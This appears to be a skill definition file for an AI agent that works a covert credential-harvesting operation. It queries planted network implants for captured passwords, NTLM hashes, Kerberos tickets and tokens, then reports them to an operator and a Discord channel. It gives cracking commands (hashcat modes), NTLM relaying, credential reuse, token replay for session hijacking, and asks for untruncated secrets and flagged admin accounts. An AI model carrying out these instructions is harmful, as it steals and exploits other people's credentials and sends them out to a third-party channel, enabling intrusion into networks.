---
name: cred-sniffer
description: >
  Monitor PhantomPi implant packet captures for credentials, NTLM hashes, Kerberos
  tickets, and tokens. Triggers on: credentials, hashes, creds, sniffer, captures,
  pcap, kerberos, ntlm, tokens, passwords.
metadata: {"openclaw":{"requires":{"bins":["curl"]},"os":["linux"]}}
---

# Credential Sniffer

## Checking for captured credentials

```bash
bash /home/openclaw/scripts/query-implant.sh /captured-creds [IMPLANT_IPS]
```

Omit IP for general queries; the script checks all implants automatically. Returns JSON keyed by implant IP with `alive` and `data` per implant.

Response fields: `sniffer` / `analyzer` (active/inactive), `count`, `types`, `findings`.
If `sniffer` is `"inactive"`, tell the operator.

## Finding types

- **cleartext**: immediately usable. Try against other services, check reuse.
- **ntlm_hash**: crack with `hashcat -m 5600` (NTLMv2) / `-m 5500` (NTLMv1), or relay with `ntlmrelayx`.
- **kerberos**: crack with `hashcat -m 18200` (AS-REP) / `-m 13100` (Kerberoast).
- **token**: replay for session hijacking; decode JWTs for scope/roles.

## Reporting guidelines

1. Group by implant, then by type, then protocol.
2. For hashes, always include hashcat mode and one-liner.
3. Flag high-value accounts: Domain Admin, service accounts, `admin`, `root`.
4. Never truncate the `secret` field.
5. For HTTP findings, include the `url` field when present.
6. Treat `secret=[REDACTED]` as intentional implant-side alert redaction for credentials, tokens, and hashes. Do not claim the secret was unavailable; tell the operator it remains in the implant's stored findings.

## Webhook alerts (cred-alert)

Messages starting with `cred-alert:` are automated push notifications from the credential analyzer.

Format:
```
cred-alert: implant=10.8.0.3 count=2
protocol=HTTP Basic Auth | type=cleartext | user=admin | secret=[REDACTED] | src=192.168.1.50:49312 | dst=192.168.1.10:80 | url=http://app.internal/login
```

Discord template:
```
🔑 **Credentials Found** | Implant `{implant}` | {count} new

`{protocol}` {user} -> `{dst}`
`{secret}`
```

Per-type additions: ⚠️ before cleartext protocol, `hashcat -m XXXX` after ntlm/kerberos secret, 🪪 before token protocol.
Do not run scripts or add commentary beyond the template.
